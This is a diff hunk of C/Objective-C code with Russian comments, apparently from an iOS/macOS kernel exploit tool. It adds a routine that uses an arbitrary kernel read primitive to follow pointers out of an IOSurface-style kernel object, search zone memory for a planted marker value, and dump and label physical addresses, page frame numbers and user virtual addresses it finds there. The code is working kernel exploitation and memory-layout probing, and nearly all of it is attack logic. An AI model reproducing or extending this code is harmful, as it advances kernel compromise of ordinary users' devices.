@@ -6460,6 +6460,55 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.205: VDB2 — (а) pointees surface (уровень 1) с маркер-чеком в zone-полосе;
+    // (б) НЕ-kernel qword'ы surf/pd/rangeObj с тегами: backingPA/pfn/pixVA/arena-
+    // подобные [0x10000000..0x1000000000) — VA-формы без 0xffffff-префикса, которые
+    // kernel-pointer фильтр отбрасывал всю дорогу (как 0x84f574000 в 1.9.202).
+    {
+        int nMark205 = 0;
+        if (kpLooksLikeKernelPointer(surfVA) && kpSafeToRead(surfVA)) {
+            for (uint32_t o = 0; o + 8 <= 0x200 && !vaFldObj; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(surfVA + o));
+                if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                for (uint32_t o2 = 0; o2 + 8 <= 0x100 && !vaFldObj; o2 += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(Q + o2));
+                    if (!kpLooksLikeKernelPointer(P)) continue;
+                    BOOL zoneBand = (P >= 0xffffffd000000000ULL && P < 0xfffffff000000000ULL);
+                    if (!zoneBand) continue;
+                    uint64_t v = early_kread64(P);
+                    if ((uint32_t)v != 0x41544159) continue;
+                    nMark205++;
+                    kpNote(r, [NSString stringWithFormat:@"  [VDB2] ★ маркер через surf+%#x→%#llx+%#x = %#llx",
+                              o, (unsigned long long)Q, o2, (unsigned long long)P]);
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [VDB2] маркер-hits по surf-pointees: %d", nMark205]);
+        // (б) не-kernel qword'ы с тегами
+        uint64_t pd205 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t ro205 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+        uint64_t objs205[3] = { surfVA, pd205, ro205 };
+        uint32_t szs205[3] = { 0x400, 0x100, 0x100 };
+        const char *names205[3] = { "surf", "pd", "rangeObj" };
+        int nDump205 = 0;
+        for (int oi = 0; oi < 3 && nDump205 < 48; oi++) {
+            uint64_t obj = objs205[oi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= szs205[oi] && nDump205 < 48; o += 8) {
+                uint64_t q = early_kread64(obj + o);
+                if (q < 0x100000ULL || q >= 0x40000000000ULL) continue;
+                if (kpLooksLikeKernelPointer(q)) continue;
+                const char *tag = "";
+                if (q == backingPA) tag = " ← backingPA!";
+                else if ((uint32_t)q == pfn32 || (uint32_t)(q >> 32) == pfn32 || q == (uint64_t)pfn32) tag = " ← pfn!";
+                else if (q == (uint64_t)pix) tag = " ← pix user VA!";
+                else if (q >= 0x10000000ULL && q < 0x1000000000ULL) tag = " (arena?)";
+                else if (q >= 0x100000000ULL && q < 0x40000000000ULL) tag = " (PA?)";
+                kpNote(r, [NSString stringWithFormat:@"    %s+%#x: %#018llx%s", names205[oi], o, (unsigned long long)q, tag]);
+                nDump205++;
+            }
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
